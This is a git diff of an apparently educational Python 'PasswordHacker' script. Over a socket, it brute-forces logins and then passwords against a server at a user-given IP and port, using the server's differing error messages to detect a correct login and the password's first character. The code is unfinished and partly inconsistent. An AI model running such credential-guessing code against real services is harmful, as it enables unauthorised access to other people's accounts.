@@ -25,7 +25,7 @@ class PasswordHacker:
                                help="You need to choose only one IP address form the list.")
         my_parser.add_argument("Port", metavar="port", type=int,
                                help="You need to input port")
-        # my_parser.add_argument("Message", metavar="message", type=str,
+        # my_parser.add_awrgument("Message", metavar="message", type=str,
         #                        help="You need to input message for sending")
 
         # Execute the parse_args() method
@@ -40,7 +40,7 @@ class PasswordHacker:
 
             client_socket.connect(address)
 
-            password_generator = self.password_generator(max_length=10)
+            password_generator = self.password_generator()
             login_generator = self.login_generator()
             self.bruteforce(password_generator, login_generator, client_socket)
 
@@ -80,24 +80,30 @@ class PasswordHacker:
                     correct_login = (json.loads(find_correct_login_return))['login']
                     print(correct_login)
                     is_correct_login_find = True
-                    is_correct_passwd_find = True
 
+            # find first password letter
+            if (is_correct_letter_of_passwd_find == False) and (is_correct_login_find == True):
+                find_first_letter_return = self.find_first_letter_of_passwd(gen_password, correct_login, client_socket)
+                # print(find_first_letter_return)
 
-            # print("SS")
-            print(correct_login)
+                if find_first_letter_return != None:
+                    correct_first_letter_of_passwd = (json.loads(find_first_letter_return))['password']
+                    print(correct_first_letter_of_passwd)
+                    is_correct_letter_of_passwd_find = True
+
+            # find correct password
+            if (is_correct_passwd_find == False) and is_correct_letter_of_passwd_find and is_correct_login_find:
+                find_correct_passwd_return = self.find_correct_password(gen_password, correct_login,
+                                                                        correct_first_letter_of_passwd,
+                                                                        client_socket)
+                is_correct_passwd_find = True
+                print(find_correct_passwd_return)
+                # if find_correct_passwd_return != None:
+                #     print(find_correct_passwd_return)
+                #     is_correct_passwd_find = True
 
             if is_correct_passwd_find:
                 break
-            # find first password letter
-            # if (is_correct_letter_of_passwd_find == False):
-            #     gen_password = self.password_generator(max_length=1)
-            #     first_letter_of_passwd = gen_password
-
-            # first_letter_of_password = gen_password
-            #
-            # # find correct password
-            # gen_password = self.password_generator(max_length=10)
-            # first_letter_of_password = gen_password
 
     def find_correct_login(self, gen_login, client_socket):
         password = " "
@@ -109,23 +115,35 @@ class PasswordHacker:
         if resp != "Wrong login!":
             return data
 
-    # def find_first_letter_of_passwd(self, gen_passwd, correct_login, client_socket):
-    #     password = next(gen_passwd)
-    #     # login = next(gen_login)
-    #     self.send_credentials(password, correct_login, client_socket)
-    #
-    #     data, resp = self.send_credentials(correct_login, password, client_socket)
-    #     print(data, resp)
-    #     if resp != "Wrong login!":
-    #         return False
+    def find_first_letter_of_passwd(self, gen_passwd, correct_login, client_socket):
+        # print(gen_passwd, "passwd")
+        # print(correct_login, "passwd")
+        password = next(gen_passwd)
+
+        data, resp = self.send_credentials(correct_login, password, client_socket)
+        # print(data, resp)
+        if resp != "Wrong password!":
+            return data
+
+    def find_correct_password(self, gen_passwd, correct_login, first_letter, client_socket):
+        # Create password
+        # passwd = first_letter
+        gen_passwd = self.password_generator(max_length=4)
+        password = next(gen_passwd)
+
+        data, resp = self.send_credentials(correct_login, password, client_socket)
+        print(data, resp)
+        if resp != "Wrong password!":
+            return data
 
     # Custom generator
-    def password_generator(self, max_length):
-        lowercase = list(string.ascii_letters)
+    def password_generator(self, max_length=2):
+        letters = list(string.ascii_letters)
         digits = list(string.digits)
+        # print(passwd)
 
         for i in range(1, max_length):
-            complexity = itertools.chain(lowercase, digits)
+            complexity = itertools.chain(letters, digits)
             for passwd in itertools.product(complexity, repeat=i):
                 yield "".join(passwd)
 
@@ -144,14 +162,3 @@ class PasswordHacker:
 
 if __name__ == "__main__":
     PasswordHacker().init()
-
-# # Custom generator
-#     def password_generator(self, max_length=10):
-#         # Set Complexity
-#         lowercase = list(string.ascii_lowercase)
-#         digits = list(string.digits)
-#
-#         for i in range(1, max_length):
-#             complexity = itertools.chain(lowercase, digits)
-#             for passwd in itertools.product(complexity, repeat=i):
-#                 yield "".join(passwd)
